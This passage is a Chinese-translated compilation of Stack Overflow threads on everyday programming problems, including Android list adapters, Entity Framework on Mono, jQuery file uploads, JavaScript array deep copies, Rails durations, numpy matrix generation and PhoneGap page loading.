此外，只是不要解析 json `getView()`- 在你得到它的地方做。

此外（如上所述），您应该`ImageLoader`只初始化一次 - 这样做的完美位置是您的应用程序的 onCreate()。然后，你称它为 - `ImageLoader.getInstance().loadSmth()`;

另外，对你的代码格式做一些事情——这太糟糕了。作为提示：

```
 final int viewType = getItemViewType(position);
        final int layoutResId;
        switch (viewType) {
            case 0:
                layoutResId = R.layout.layout_1;
                break;
            case 1:
                layoutResId = R.layout.layout_2;
                break;
            default:
                layoutResId = R.layout.layout_3;
        }

        final View view = mInflater.inflate(layoutResId, group, false); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-01-20T12:46:19.980

您可以做的修复很少

你的视图持有者几乎没用。您必须按以下方式使用它

```
ViewHolder viewHolder;
if (view == null) {
    viewHolder = new ViewHolder();    
    viewHolder.image = (ImageView) view.findViewById(R.id.capsule_media_list_item_thumbnail_1);             
    view.setTag(viewHolder);    
}else{
 viewHolder =  view.getTag(viewHolder); 
} 
```

您应该只声​​明一次 ImageLoader 和 DisplayImageOptions 实例。可能在构造函数中。

```
ImageLoader imageLoader = ImageLoader.getInstance();
DisplayImageOptions options = new DisplayImageOptions.Builder().cacheInMemory(true)
        .cacheOnDisc(true).resetViewBeforeLoading(true)
        .showImageForEmptyUri(fallbackImage)
        .showImageOnFail(fallbackImage)
        .showImageOnLoading(fallbackImage).build(); 
```

# entity-framework - System.InvalidProgramException System.Data.Objects.ObjectContext:.ctor (string,string) 中的 IL 代码无效：方法主体为空

> ID：13756475
> 
> 赞同：0
> 
> 时间：2012-12-07T03:26:11.670
> 
> 标签：entity-framework, mono, raspberry-pi

我在树莓派上使用单声道（3.0.3）。除实体框架外，一切正常。我可以毫无问题地登录到我的网站，但是当我进入一个存在实体框架的区域时，我在 XSP 中收到以下错误：

```
Application Exception
System.InvalidProgramException
Invalid IL code in System.Data.Objects.ObjectContext:.ctor (string,string): method body is empty.

Description: HTTP 500.Error processing request.
Details: Non-web exception. Exception origin (name of application or object): AdwenModel.
Exception stack trace:
  at AdwenModel.AdwenEntities1..ctor (System.String connectionString) [0x00000] in <filename unknown>:0 
  at AdwenWeb.App_Code.AdwenConnection.getDataContextAdwen () [0x00000] in <filename unknown>:0 
  at AdwenWeb.Management.overview.createObjectTable () [0x00000] in <filename unknown>:0 
  at AdwenWeb.Management.overview.Page_Load (System.Object sender, System.EventArgs e) [0x00000] in <filename unknown>:0 
  at System.Web.UI.Control.OnLoad (System.EventArgs e) [0x00029] in /opt/mono-3.0/mono/mcs/class/System.Web/System.Web.UI/Control.cs:1211 
  at System.Web.UI.Control.LoadRecursive () [0x00031] in /opt/mono-3.0/mono/mcs/class/System.Web/System.Web.UI/Control.cs:1641 
  at System.Web.UI.Page.ProcessLoad () [0x0004a] in /opt/mono-3.0/mono/mcs/class/System.Web/System.Web.UI/Page.cs:1490 
  at System.Web.UI.Page.ProcessPostData () [0x0004d] in /opt/mono-3.0/mono/mcs/class/System.Web/System.Web.UI/Page.cs:1475 
  at System.Web.UI.Page.InternalProcessRequest () [0x001bf] in /opt/mono-3.0/mono/mcs/class/System.Web/System.Web.UI/Page.cs:1442 
  at System.Web.UI.Page.ProcessRequest (System.Web.HttpContext context) [0x00062] in /opt/mono-3.0/mono/mcs/class/System.Web/System.Web.UI/Page.cs:1269 
Version Information: 3.0.3 (master/c1b505c Thu Dec 6 09:17:47 UTC 2012); ASP.NET Version: 4.0.30319.17020 
```

真的不知道还有什么问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-08T01:03:30.093

我对 Mono 中的实体框架支持了解不多，但我所知道的是它们在 Mono 中包含了 EF6，并且 System.Data.Objects 不再是 EF6 中 ObjectContext 的命名空间。无论导致失败的原因应该是寻找 System.Data.Entity.Core.Objects.ObjectContext 。

希望这可以帮助。

# javascript - Jquery 和 HTML 表单的行为不同

> ID：13756477
> 
> 赞同：0
> 
> 时间：2012-12-07T03:26:35.730
> 
> 标签：javascript, jquery, html, jquery-ui

下面的页面有两种形式，一种是没有修饰的简单上传表单，另一种是使用jquery-ui库进行修饰的表单。当我单击常规表单的提交按钮时，数据完全被提交，我的意思是上传的文件完美地转到所需的文件夹，但是当我使用点击按钮触发其他表单的提交功能时，servlet 被调用但相同的参数不会传递给 servlet。我的意思是当我使用装饰表单提交时，没有任何内容被发布到 servlet。

HTML 代码：

```
<html>
<head>
<script type="text/javascript" src="./jquery.js"></script>
<link rel="stylesheet" type="text/css" href="jquery-ui.css" />
<script type="text/javascript" src="jquery-ui.js"></script>

<title></title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
</head>

<body>
    <div id="open-form">Upload your file</div>
    <div id="dialog-form" title="Select your file">
        <form id="uploadForm" action="./uploadFile "
            enctype="multipart/form-data" method="POST">
            <fieldset>
                <label for="name"><b>Filepath</b></label> <input type="file"
                    class="text ui-widget-content ui-corner-all" id="name" />
            </fieldset>
        </form>
    </div>

    <form action="./uploadFile" enctype=" multipart/form-data" method="POST">
        <div class="box2">
                Select your File</br> 
                <input type="file" name="Uploaded file"> 
                <input type="submit" class="button" value="Upload">
        </div>
    </form>

    <script type="text/javascript">
        $(function() {

            var name = $("#name"), allFields = $([]).add(name);
            $("#dialog-form").dialog({
                autoOpen : false,
                height : 300,
                width : 460,
                modal : true,
                buttons : {
                    "Upload" : function() {
                        document.forms["uploadForm"].submit();
                    },
                    Cancel : function() {
                        $(this).dialog("close");
                    }
                },
                close : function() {
                    allFields.val("").removeClass("ui-state-error");
                }
            });
            $("#open-form").click(function() {

                $("#dialog-form").dialog("open");

            });

        });
    </script>

</body> 
```

在标签中添加 javascript 只是为了确定。这是servlet代码：

```
public void doPost(HttpServletRequest req, HttpServletResponse res) {
        try {           
            int formDataLength = req.getContentLength();
            byte dataBytes[] = new byte[formDataLength];
            DiskFileItemFactory factory = new DiskFileItemFactory();
            factory.setSizeThreshold(4096);
            factory.setRepository(new File("/location/y-folder"));
            ServletFileUpload upload = new ServletFileUpload(factory);
            upload.setSizeMax(10000000);
            List fileItems = upload.parseRequest(req);           
            Iterator i = fileItems.iterator();
            FileItem fi = ((FileItem) i.next());
            InputStream inputStream = fi.getInputStream();
            String path = fi.getName();
            long h = fi.getSize();
            File f = new File("/location/x-folder"+path);
            OutputStream out = new FileOutputStream(f);
            int len;
            while ((len = inputStream.read(dataBytes)) > 0) {
                out.write(dataBytes, 0, len);
            }
            out.close();
            inputStream.close();

            System.out.println("Fi:-" + fi.toString());
}catch(Exception e){
system.out.println(e);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T06:05:38.890

在表单提交期间需要提交给服务器的所有输入元素都应该始终具有该`name`属性。

考虑以下行中的代码：

```
<label for="name"><b>Filepath</b></label> <input type="file"
     class="text ui-widget-content ui-corner-all" id="name" /> 
```

并将其更改如下：

```
<label for="name"><b>Filepath</b></label> <input type="file"
     class="text ui-widget-content ui-corner-all" id="name"
     name="Uploaded file" /> 
```

# javascript - 创建多维数组的副本，而不是引用 - JavaScript

> ID：13756482
> 
> 赞同：94
> 
> 时间：2012-12-07T03:28:13.290
> 
> 标签：javascript, arrays, copy

这也被称为“深度复制”，我已经找到了一些文章。最接近的似乎是[这个，](https://stackoverflow.com/questions/565430/deep-copying-an-array-using-jquery)但它适用于 jQuery - 我正在尝试在没有库的情况下执行此操作。

我还在两个地方看到可以执行以下操作：

```
arr2 = JSON.decode(JSON.encode(arr1)); 
```

但这显然是低效的。也可以单独循环和复制每个值，并在所有数组中重复。这似乎也很累而且效率低下。

那么复制 JavaScript 多维数组的最有效、非库方法是`[[a],[b],[c]]`什么？如有必要，我对“非 IE”方法非常满意。

谢谢！

* * *

## 回答 #1

> 赞同：107
> 
> 时间：2012-12-07T04:08:31.633

由于听起来您正在处理某个未知深度级别的数组数组，但您只需要在任何给定时间在一个深度级别上处理它们，那么它的使用将变得简单快捷`.slice()`。

```
var newArray = [];

for (var i = 0; i < currentArray.length; i++)
    newArray[i] = currentArray[i].slice(); 
```

或使用`.map()`而不是`for`循环：

```
var newArray = currentArray.map(function(arr) {
    return arr.slice();
}); 
```

所以这会迭代当前的数组，并构建一个新的嵌套数组的浅拷贝数组。然后当你进入下一个深度层次时，你会做同样的事情。

当然，如果混合了数组和其他数据，您需要在切片之前测试它是什么。

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2012-12-07T03:38:51.450

我不确定`JSON.stringify`and`JSON.parse`比`encode`and好多少`decode`，但是您可以尝试：

```
JSON.parse(JSON.stringify(array)); 
```

我发现的其他东西（虽然我会稍微修改一下）：

[http://www.xenoveritas.org/blog/xeno/the-correct-way-to-clone-javascript-arrays](http://www.xenoveritas.org/blog/xeno/the-correct-way-to-clone-javascript-arrays)

```
function deepCopy(obj) {
  if (typeof obj == 'object') {
    if (isArray(obj)) {
      var l = obj.length;
      var r = new Array(l);
      for (var i = 0; i < l; i++) {
        r[i] = deepCopy(obj[i]);
      }
      return r;
    } else {
      var r = {};
      r.prototype = obj.prototype;
      for (var k in obj) {
        r[k] = deepCopy(obj[k]);
      }
      return r;
    }
  }
  return obj;
} 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-12-07T04:13:00.933

当您要求性能时，我想您也会使用非通用解决方案。要复制具有已知级别数的多维数组，您应该使用最简单的解决方案，即一些嵌套的 for 循环。对于您的二维数组，它看起来像这样：

```
var len = arr.length,
    copy = new Array(len); // boost in Safari
for (var i=0; i<len; ++i)
    copy[i] = arr[i].slice(0); 
```

要扩展到更高维数组，请使用递归或嵌套 for 循环！

本机[`slice`方法](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array/slice)比自定义 for 循环更有效，但它不会创建深层副本，因此我们只能在最低级别使用它。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-12-07T03:38:54.063

任何不访问同一个节点两次的递归算法都将与使用 javascript（至少在浏览器中）一样有效 - 在其他语言的某些情况下，您可能会避免复制内存，但 javascript 显然没有没有那个能力。

我建议找一个[已经做过的人，](http://oranlooney.com/deep-copy-javascript/)并使用他们的实现来确保你做对了——它只需要定义一次。

# javascript - 为什么 webkit 中没有触发 'beforepaste' 事件？

> ID：13756489
> 
> 赞同：4
> 
> 时间：2012-12-07T03:29:18.750
> 
> 标签：javascript, html, safari, dom-events

`beforecopy`事件被触发，但`beforepaste`事件没有被触发。这是为什么？

```
<!DOCTYPE HTML>
<html lang="en">
<head>
<meta charset="UTF-8">
<style type="text/css">#editor{width:300px; height:300px; border: 1px solid black;}</style>
</head>
<body>
<div id="editor" contentEditable="true">editor</div>
<script type="text/javascript">
var elEditor = document.getElementById("editor");

elEditor.addEventListener('beforecopy', function(e){
    console.log('beforecopy');
    e.preventDefault();
    e.stopPropagation();
}); 

elEditor.addEventListener('copy', function(e){
    console.log('copy');
}); 

elEditor.addEventListener('beforepaste', function(e){
    console.log('beforepaste');
    e.preventDefault();
    e.stopPropagation();
}); 

elEditor.addEventListener('paste', function(e){
    console.log('paste')
});
</script>
</body>
</html> 
```

*   [在 JavaScript 中使用粘贴板](https://developer.apple.com/library/archive/documentation/AppleApplications/Conceptual/SafariJSProgTopics/Tasks/CopyAndPaste.html)
*   小提琴链接：http: [//jsfiddle.net/BjR9q/](http://jsfiddle.net/BjR9q/)

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-07T03:42:32.087

在 OS X 10.8.2 上的 Chrome 23.0.1271.95 上，`onbeforepaste`仅在用户弹出上下文菜单时触发。

[http://help.dottoro.com/ljxqbxkf.php](http://help.dottoro.com/ljxqbxkf.php)：

> 在剪贴板的内容粘贴到文档之前发生，并提供启用“**粘贴”菜单项**的可能性。

右键单击文本框会`onbeforepaste`触发事件，但不会按`ctrl`-<kbd>v。

如果有什么安慰的话`onpaste`，在我的测试中，该事件会在实际粘贴文本之前触发，所以我只会使用该`onpaste`事件。

# html - “焦点”如何在文档中流动？

> ID：13756491
> 
> 赞同：0
> 
> 时间：2012-12-07T03:30:08.330
> 
> 标签：html, css

我有一个粗略的想法，它从`<input>`到跳跃，`<input>`但有任何文档吗？我的目的是寻找一种仅在 css 中设置焦点的方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T04:47:18.573

如果“焦点”是指在呈现页面中的元素之间切换时获得焦点的元素，则该`tabindex=nn`属性定义了切换顺序。

根据[W3C 文档](http://www.w3.org/TR/html401/interact/forms.html#adef-tabindex)

> 以下元素支持 tabindex 属性：A、AREA、BUTTON、INPUT、OBJECT、SELECT 和 TEXTAREA

另请参阅[使用 Tabindex 属性创建逻辑跳位顺序](http://www.w3.org/WAI/GL/wiki/Creating_Logical_Tab_Order_with_the_Tabindex_Attribute)

# actionscript-3 - 在 Actionscript 中为一个函数使用两个事件监听器

> ID：13756496
> 
> 赞同：3
> 
> 时间：2012-12-07T03:30:30.493
> 
> 标签：actionscript-3, addeventlistener

我正在使用 actionscript 3 在 Flash 中制作点和框游戏。

目前我完全卡住了，因为我希望玩家在显示一行之前单击两个按钮。我计划使用 if 语句做这样的事情

```
if button1 and button2 clicked 
line1 visible = true 
```

我也尝试过使用一个功能添加事件监听器

```
function showLine(e:Event):void {
blue0001.visible = true
}
dot00.addEventListener(MouseEvent.CLICK, showLine); 
```

但据我所知，这只能在您想单击一个按钮时使用。在函数执行之前是否有两个事件监听器得到满足？另外，我将如何（如果可以）使用 if 语句来执行此操作？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-07T03:44:24.340

你可能会做这样的事情，伪代码：

假设所有点都在一个`dots`数组中。

```
for (var i: Number = 0; i < dots.length; i++) {
    dots.addEventListener(MouseEvent.CLICK, dotClicked, false, 0, true);
}

dotSelected = null;
function dotClicked(evt:MouseEvent):void {
    if (dotSelected && isNeighbor(evt.target, dotSelected)) {
        showLineConnecting(evt.target, dotSelected)
        dotSelected = null;
    } else if (!dotSelected) {
        highlightDot(evt.target);
        dotSelected = evt.target;
    } else {
        showError("You must click an adjacent dot");
    }
} 
```

应 OP 的要求，这就是正在发生的事情。

```
for (var i: Number = 0; i < dots.length; i++) {
    dots.addEventListener(MouseEvent.CLICK, dotClicked, false, 0, true);
} 
```

为每个点添加一个事件侦听器。在这里，我假设您已经定义了一个点数组。Array 中的每个实例都可能是一个 MovieClip（可能）、Sprite 或另一个 DisplayObject。

```
dotSelected = null; 
```

我们将使用一个变量来跟踪任何当前选择的点。由于游戏开始时不会选择点，因此我们将其设置为 null。

```
function dotClicked(evt:MouseEvent):void {
    if (dotSelected && isNeighbor(evt.target, dotSelected)) {
        showLineConnecting(evt.target, dotSelected)
        dotSelected = null;
    } else if (!dotSelected) {
        highlightDot(evt.target);
        dotSelected = evt.target;
    } else {
        showError("You must click an adjacent dot");
    }
} 
```

**这是单击任何**点时将调用的函数。为了解释的缘故，让我们以游戏的第一次点击为例。 `dotSelected`为空，所以第一个`if`是`false`. 第二个`if`虽然是`true`，因为`(!dotSelected)`是`true`。所以，我们运行一些我`highlightDot`用点作为参数调用的函数。该函数可能如下所示：

```
function hightlightDot(dot:Dot):void {
    dot.gotoAndStop("selected");
} 
```

现在进行第二次点击。现在第一部分的第一`if`部分`dotSelected`是`true`。现在评估第二部分。我再次输入了一个组合函数`isNeighbor`。该`isNeighbor`函数有两个参数，刚刚被点击的点和已经被点击的点。此功能需要确保两个点相邻。这可能是...

```
function isNeighbor(dot1:Dot, dot2:Dot):void {
    return ((dot1.xGrid == dot2.xGrid && Math.abs(dot1.yGrid - dot2.yGrid) == 1) || (Math.abs(dot1.xGrid - dot2.xGrid) == 1) && dot1.yGrid == dot2.yGrid));
} 
```

上面的函数假设 的实例`Dot`具有一些属性`xGrid`，`yGrid`并定义了它们在棋盘中的位置。如果它们在同一行且相隔 1 列，则它们是邻居。如果它们在同一列中且相隔 1 行，则它们是邻居。

调用函数中发生的最后一件事`showLineConnecting`。该函数将再次将两个相邻的点作为参数。然后，它将以您选择的任何方式在它们之间画一条线。最后，dotSelected 被设置回 null，允许选择另一组点。

我刚刚意识到的一件事，当它连接到它的所有邻居时，如果有一个额外的属性被触发，它可能会有所帮助，`Dot`这样它就不能再被选中了。

您还需要逻辑来处理知道已创建框的情况。为此，您可能会在给定刚刚绘制的线的情况下迭代可能性。对于绘制的每条线，只创建了两个可能的框。所以检查他们两个。注意边缘。

# ruby-on-rails - 如何在 Rails 中将“3.days”转换为字符串“3 days”？

> ID：13756501
> 
> 赞同：2
> 
> 时间：2012-12-07T03:30:57.483
> 
> 标签：ruby-on-rails, ruby

我需要将一个简单的“3.days”字符串转换为在屏幕上打印“3 days”的内容，该字符串将根据语言使用适当的语言环境来打印单词。

我想在 Rails 上可能有一种我似乎找不到的简单方法。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-12-07T03:39:21.310

调用`inspect`结果。它已被覆盖以返回字符串`"3 days"`：

```
Loading development environment (Rails 3.2.6)
irb(main):001:0> 3.days.inspect
=> "3 days" 
```

在幕后，`3.days`只是返回该时间段内的秒数：

```
irb(main):001:0> puts 3.days
259200 
```

`3`如果您要存储该整数值，则可以通过将数字除以一天中的秒数来回到您的起点：

```
num_days = 3.days / 1.day
puts "#{num_days} days" # 3 days 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-07T11:46:39.583

如果您将输入作为字符串并且输出也需要是字符串，则一种解决方案是使用 gsub 替换 '.' 和 ' '

```
1.9.3p194 :004 > '3.days'.gsub('.', ' ')
 => "3 days" 
```

# ruby-on-rails - 如何在 Ruby on Rails 中从数据库结果集中的字段创建数组？

> ID：13756502
> 
> 赞同：0
> 
> 时间：2012-12-07T03:31:12.993
> 
> 标签：ruby-on-rails, ruby

基本上我在数据库表中有 3 个字段，我想返回一个数组来表示每一行。

sqlite 数据库结果集：

```
row 1)
name: John
gender: male
email: john@john.com

row 2)
name: Sarah
gender: female
email: sarah@sarah.com 
```

上述结果集中的所需格式：

```
[['John',male,'john@john.com'],['Sarah',female,'sarah@sarah.com']] 
```

我试过使用`User.all.map(&:name)`，但这只会给我`['John','Sarah']`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-07T03:36:56.290

你会想要使用`map`，但是像这样：

```
User.all.map {|u| [u.name, u.gender, u.email]} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T03:39:07.270

```
User.all.map {|u| [u.name, u.gender, u.email] } 
```

# javascript - 当窗口变大时，为什么我的响应式菜单不会重新显示为列表？

> ID：13756513
> 
> 赞同：1
> 
> 时间：2012-12-07T03:33:24.037
> 
> 标签：javascript, html, list, mobile, menu

我有一个侧边栏列表，我正在响应地变成一个简单的下拉手风琴按钮。问题是，当您将窗口调整为较小时，打开然后关闭列表，然后将窗口调整为较大。该列表不会以“桌面”形式重新出现。

演示：http: [//iamalecschmidt.com/newblog/](http://iamalecschmidt.com/newblog/)

我正在使用一些简单的 Javascript 来切换菜单以将侧边栏切换到菜单：

的HTML：

```
<aside class="left-sidebar">

    <p class="intro">Hey! I’m Alec.</p>
    <p class="bio">
        I <a href="#">design</a> interfaces for websites & apps, I also 
        <a href="#">cook</a> and I am an aspiring front-end 
        <a href="#">developer</a>.
    </p>

    <div class="leftNavWrap">

        <ul class="leftNav">
            <li><a href="#">Home</a></li>
            <li><a href="#">Work</a></li>
            <li><a href="#">About</a></li>
            <li><a href="#">Contact</a></li>
        </ul>

        <a class="topicsButton" href="#">Topics &nbsp;<span>&#9660;</span></a>
        <a class="dribbbleIcon" href="#">Dribbble</a> 
        <a class="twitterIcon" href="#">Twitter</a>
    </div>
</aside> 
```

JAVASCRIPT：

```
<script type="text/javascript"> // responsive menu
jQuery(document).ready(function($){

    /* prepend menu icon */
    $('p.bio').append('<div id="menu-button"><p>Menu</p></div>');

    /* toggle nav */
    $("#menu-button").on("click", function(){
        $('div.leftNavWrap').slideToggle();
        $(this).toggleClass("active");
    });

});
</script> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T04:09:13.263

`slideToggle`将切换元素的样式设置为`display:none`关闭时（[http://api.jquery.com/slideToggle/](http://api.jquery.com/slideToggle/)），因此当您将大小调整回“桌面”时，该元素将保持隐藏状态。

您需要检查宽度何时扩展超过“桌面”断点并确保它可见，或使用另一种显示/隐藏方法，例如切换类并使用 css 转换应用动画。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T04:06:27.793

我发现了问题。。

当您在顶部打开菜单并最大化时，它将起作用。当您关闭菜单并最大化您的窗口时，就会出现问题。

仍然**离开NavWrap的**显示是无..

如果您需要更多帮助，请在您显示和隐藏顶部菜单和侧边栏的位置显示您的代码...

# python - 填充 2D 矩阵，使得没有两个相邻值相同

> ID：13756519
> 
> 赞同：0
> 
> 时间：2012-12-07T03:35:19.113
> 
> 标签：python, language-agnostic, numpy

我想估计算法的最坏情况，其中迭代次数取决于图像中有多少像素具有与自身不同的邻居。假设图像是灰度的，我正在寻找一种方法来生成一个`M x N`填充随机值的矩阵，`[0, 255]`其中没有两个具有相同值的像素是连续的（包括“角落”邻居，即这是针对 8-邻居案例）。

**编辑：**应该在原始帖子中更清楚地说明这一点。我希望对 range 中的所有值进行相对统一的采样`[0, 255]`。

如何做到这一点？解决方案的效率并不重要，我正在寻找易于推理的东西。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T03:42:33.387

```
0 1 0 1 0 1 0
2 3 2 3 2 3 2
1 0 1 0 1 0 1 
```

等等

更一般地，尝试为图形着色的最愚蠢的方法是依次访问每个顶点（以您喜欢的任何顺序），并为其相邻的顶点赋予尚未使用的颜色。如果（在这种情况下）您的颜色多于可能的最大相邻顶点数，您就不会输。

上面的网格是沿着每一行从左到右访问矩阵的结果，并使用最小的可用值。您可以改为从可用值中随机选择一个：

```
import random
rows = [[None] * 10 for i in xrange(10)] # or numpy matrix
for i, row in enumerate(rows):
    for j, _ in enumerate(row):
        available = set(xrange(256))
        if j > 0:
            available.discard(row[j-1])
        if i > 0:
            available.difference_update(rows[i-1][max(0,j-1):j+2])
        row[j] = random.choice(tuple(available))
print '\n'.join(map(str, rows)) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T09:42:40.110

既然你提到效率并不重要，试试这个：

```
 from numpy import array
  import random

  available = range(256)
  M=10
  N=5
  def generate():
    return random.choice(available)

  def get_neighbours(i,j):
    neighbours = []
    try:
      neighbours.append(matrix[i][j-1])
      neighbours.append(matrix[i][j+1])
      neighbours.append(matrix[i+1][j])
      neighbours.append(matrix[i-1][j])
      neighbours.append(matrix[i-1][j-1])
      neighbours.append(matrix[i-1][j+1])
      neighbours.append(matrix[i+1][j-1])
      neighbours.append(matrix[i+1][j+1])
    except:
      pass
    return neighbours

  def remove_neighbours(neighbours):
  available = range(256)
    for i in neighbours:
       try: available.remove(i)
       except: pass
    return available

  #First initialize a random matrix without any condition
  matrix = array([[generate() for i in range(M)] for j in range(N)])

  #Apply the condition and modify the matrix
  for i in range(N):
    for j in range(M):
      neighbours = get_neighbours(i,j)
      available = remove_neighbours(neighbours)
      matrix[i][j] = generate() 

  print matrix

 [[215  91   6 110 166 214 189  63  89 107]
  [  5 136  85 200 216  87 105 223 132 112]
  [179 159 116  70   3  44 238  13  41 226]
  [ 48   0  37 248 209 162 211  61  50  40]
  [237 122 135 253 219 196  92 173 163  26]] 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-07T03:49:22.357

Try this:

```
import numpy as np
np.cumsum(np.cumsum(np.ones((M,N)),axis=0),axis=1) % 255 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-07T04:13:14.610

```
import numpy as np
from random import sample
def foo(M,N):
    #Create an np array of size M X N
    img = np.zeros((M,N))
    #Create a colour set within grayscale
    colours = set(range(255))
    #Iterate through the entire image pixel
    for i in range(M):
        for j in range(N):
            #img[i-1:i+2,j - 1:j + 2].flatten() : neighbouring pixel
            #including the current pixel
            #colours- set(img[i-1:i+2,j - 1:j + 2].flatten() : Colours not in the neighbouring pixel
            #sample(colours- set(img[i-1:i+2,j - 1:j + 2].flatten()),1)[0]: Select one from the above
            #and assign to the current pixel
            img[i,j] = sample(colours- set(img[i-1:i+2,j - 1:j + 2].flatten()),1)[0]
    return img

>>> foo(10,10)
array([[ 153.,  128.,   15.,  163.,  180.,  189.,  186.,  228.,   65.,
         140.],
       [  52.,  229.,  220.,   54.,   79.,  105.,   11.,  146.,   29.,
          70.],
       [ 244.,  119.,  188.,  147.,  230.,  157.,   28.,  243.,  105.,
          62.],
       [ 188.,  135.,  129.,  144.,  192.,   11.,   90.,  193.,   35.,
         149.],
       [  20.,  130.,  140.,  134.,  191.,   63.,   50.,  180.,   49.,
           4.],
       [  88.,  175.,  254.,  151.,  176.,   30.,  122.,  157.,   88.,
          82.],
       [  37.,  190.,   10.,  187.,  221.,   83.,    2.,  115.,  191.,
         148.],
       [  53.,   70.,  150.,  127.,  168.,  141.,  179.,   65.,  253.,
          59.],
       [  96.,    3.,  225.,  218.,   87.,   76.,   41.,  195.,  221.,
         192.],
       [  28.,   35.,  104.,  130.,  207.,   57.,  204.,  228.,   96.,
         174.]]) 
```

# android - PhoneGap Android项目中的多个Html文件

> ID：13756522
> 
> 赞同：3
> 
> 时间：2012-12-07T03:35:40.770
> 
> 标签：android, cordova, jquery-mobile, phonegap-plugins

我正在使用 Eclipse 在 Android 中使用 Phone Gap、Jquery Mobile 开发一个跨平台应用程序。我根本没有在我的应用程序中使用任何 PhoneGap 功能。我使用 PhoneGap 的目的是通过 Adob​​e PhoneGap 构建服务为 ios、Android、windows 等构建原生应用程序。在 android assest/www/ 文件夹下，我创建了多个子文件夹，如 css、js、html 等，其中放置了我的 jquery mobile html、css、js 文件和我的自定义 js、html、css。注意在 www 目录下我有 cordova.js 和 index.html，cordova jar 也包含在构建路径中。当我在 eclipse + Android 模拟器中运行它时，我的应用程序运行良好。它正在生成有效的 apk 并打开我的应用程序根页面welcome.html，它位于 www/html/welcome.html 下。问题是当我通过将代码上传到 Adob​​e PhoneGap Build 服务来生成 android 构建时，它提供了有效的 apk，在安装打开 index.html 之后，它位于 www/index.html 下。我是我的 DroidGap 活动，我只加载welcome.html。

```
 super.loadUrl("file:///android_asset/www/html/welcome.html"); 
```

任何建议请。由于一些设计限制，我需要在 www 目录下有多个 html 页面和文件夹。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T12:02:00.327

我不确定我是否理解你的意思。

也许你可以尝试：

```
$.mobile.changePage('./html/welcome.html'); 
```

将此添加到您的 javascript 事件的侦听器中，它应该可以工作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-10-19T19:51:30.723

For Phonegap Build to work, all your generic src files need to be in www of the base directory. Any Android specific files go in /www/res/android or /merge. See phonegap and/or codrova documentation.

One of the problems with using Eclipse and Phonegap together is that if you imported your project as an existing Android project, then all work you do is in the Android platform directories, not www.

Main reason why I now use Netbeans with Phonegap 3.0 CLI:

In terminal:

*   phonegap create [project dir name]
*   cd [project dir name]
*   phonegap local build android
*   add plugins
*   replace generic phonegap /www files with your project specific files & dirs

In netbeans IDE:

*   new project -> html5 -> use current src code
*   tweak /www/context.xml app name, ......
*   .......

In terminal:

*   adb connect 192.168.1.??? [Android-X86 in VB guest]
*   adb devices [are devices showing?]
*   phonegap local run android [build and installs to VB Android-X86 guest]
*   debug ....
*   phonegap remote build android [use Adobe Phonegap Build]
*   .......

Note: new Netbeans 7.4 RC2/Development includes Cordova development. Tried, but while has some interesting features, seemed to include the kitchen sink when doing initial build. Very slow to compile. Disabled feature. Also background scanning chokes. Turned off with plugin, but remember to manually rescan project files, especially if did work outside IDE. Couldn't set up Android-X86 in VB as my emulator. Why I use the above workflow.

Peter

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-06T11:53:18.370

**我的建议是将welcome.html**的所有内容复制到**www/index.html**并保持默认`super.loadUrl("file:///android_asset/www/index.html");`。
您可以稍后使用切换视图`window.location.href='html/anypage.html';`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-11T20:26:12.587

默认情况下，index.html，或者在这种情况下，welcome.html，应该位于 www 目录的根目录中。由于不是这种情况，您可以尝试在 phonegap/cordova config.xml 文件中添加以下标签

```
 <content src="html/welcome.html" /> 
```

* * *

## 回答 #5

> 赞同：-2
> 
> 时间：2016-05-11T08:21:41.983

我有同样的问题。我正在 android studio 中转换我的 html 网站文件。所以，在资产下我粘贴了我的网站文件夹.. 我怎样才能运行我导入的所有 html 文件？我使用了代码`webView.loadUrl("file:///android_asset/anamayyy/main.html");` ，它只显示了主要的 html。我用作按钮的链接不起作用..

[下一页的链接不显示（网页不可用](http://i.stack.imgur.com/h7C5q.png)

# android - 在锁定屏幕上显示 Dialogfragment

> ID：13756524
> 
> 赞同：1
> 
> 时间：2012-12-07T03:36:24.827
> 
> 标签：android, dialog, fragment, lockscreen, keyguard

我正在尝试在锁定屏幕上显示 DialogFragment。当用户通过新的 keyguard 小部件功能触发操作时，这必须发生。

特别是它显示了一个时间选择器对话框，但用户只有在解锁屏幕时才能看到它。即使屏幕被锁定，我如何设法显示它？

我已经尝试了这些标志的所有组合，但没有成功：

```
AlertDialog dialog = dBuilder.create();
    Window window = dialog.getWindow();

    window.addFlags(WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
            + WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
            + WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
            + WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON); 
```

这在 onCreateView 中调用。

谢谢你的支持！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T03:49:17.047

